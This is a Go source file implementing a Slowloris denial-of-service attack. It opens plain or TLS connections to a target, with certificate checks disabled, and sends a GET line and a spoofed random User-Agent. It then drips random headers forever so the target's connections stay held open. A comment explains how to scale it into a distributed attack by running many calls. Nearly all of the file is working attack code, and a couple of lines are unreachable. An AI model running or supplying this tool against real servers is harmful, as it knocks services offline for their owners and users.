package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/icrowley/fake"
)

// Slowloris performs single threaded slow loris attack. If you want to run distributed
// attack, just run multiple calls of the function over the same URL.
func Slowloris(ctx context.Context, index int64, options Options) error {
	// append port if not presented in the host
	url := options.URL
	host := url.Host
	secure := false
	if url.Scheme == "https" {
		secure = true
	}

	if !strings.Contains(host, ":") {
		if secure {
			host = fmt.Sprintf("%s:%s", url.Host, "443")
		} else {
			host = fmt.Sprintf("%s:%s", url.Host, "80")
		}
	}

	conn, err := Dialer(host, secure)
	if err != nil {
		fmt.Println(err)
		return nil
		return err
	}

	// send HTTP GET request line
	getRequest := GetRequestLine(url.Path)
	fmt.Printf("slowloris(%d): sending request line (%s)\n", index, getRequest)
	line := httpLine(getRequest)
	n, err := conn.Write([]byte(line))
	if err != nil || n < len(line) {
		return err
	}

	// send User-Agent header
	userAgent := options.UserAgent
	if userAgent == "random" {
		userAgent = fake.UserAgent()
	}
	fmt.Printf("slowloris(%d): sending user agent (%s)\n", index, userAgent)
	line = httpLine(Header("User-Agent", userAgent))
	n, err = conn.Write([]byte(line))
	if err != nil || n < len(line) {
		return err
	}

	interval := options.Interval
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(interval):
			header := RandomHeader()
			fmt.Printf("slowloris(%d): send header (%s)\n", index, header)
			line = httpLine(header)
			n, err := conn.Write([]byte(line))
			if err != nil || n < len(line) {
				return err
			}
		}
	}

	return nil
}

// Dialer creates either non-secure or TLS secured TCP connection to send data
// to target server
func Dialer(host string, secure bool) (net.Conn, error) {
	proto := "tcp"

	// create tls tcp connection
	if secure {
		return tls.Dial(proto, host, &tls.Config{
			InsecureSkipVerify: true,
		})
	}

	// create non-secure tcp connection
	return net.Dial(proto, host)
}

// GetRequestLine returns HTTP request line for GET request
func GetRequestLine(path string) string {
	return fmt.Sprintf("GET %s HTTP/1.1", path)
}

// func Header formats header key and value
func Header(key, val string) string {
	return fmt.Sprintf("%s: %s", strings.Title(key), val)
}

// RandomHeader generates a random HTTP header to send as part of the
// slowloris attack
func RandomHeader() string {
	return Header(fake.Word(), fake.Word())
}

// ClosingLine sends a closing line for a HTTP request
func ClosingLine() string {
	return httpLine(httpLine(""))
}

// httpLine appends end of header \r\n
func httpLine(str string) string {
	return str + "\r\n"
}
